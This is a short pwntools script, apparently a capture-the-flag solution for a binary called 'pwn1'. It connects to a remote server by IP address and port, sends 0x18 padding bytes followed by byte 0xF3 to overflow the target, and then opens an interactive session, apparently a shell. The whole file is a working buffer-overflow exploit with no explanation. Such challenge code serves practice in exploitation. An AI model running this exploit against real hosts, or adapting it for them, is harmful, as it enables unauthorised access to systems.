from pwn import *

# p = process("./pwn1")
p = remote("39.107.92.230", 10001)
p.sendline("v" * 0x18 + "\xF3")
p.interactive()
